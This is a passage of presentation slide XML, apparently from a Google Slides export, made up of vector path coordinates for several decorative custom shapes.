                  <a:lnTo>
                    <a:pt x="8474" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="2714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="2494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="2017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="1907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="1797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="1761"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="954" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="771" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="1467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="4108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="6162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="1210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="73"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138"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09" name="Google Shape;309;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6950850" y="4617725"/>
              <a:ext cx="254050" cy="162350"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="10162" h="6494" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="8291" y="587"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8291" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="587"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8401" y="147"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8181" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="147"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3999" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3926" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5503" y="3779"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5246" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3779"/>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0" name="Google Shape;310;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6051225" y="1090800"/>
              <a:ext cx="285225" cy="283400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="11409" h="11336" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="5173" y="4219"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5136" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="4219"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5980" y="6016"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6017" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="6016"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5833" y="5613"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5723" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6274" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="5613"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3926" y="441"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4623" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7191" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
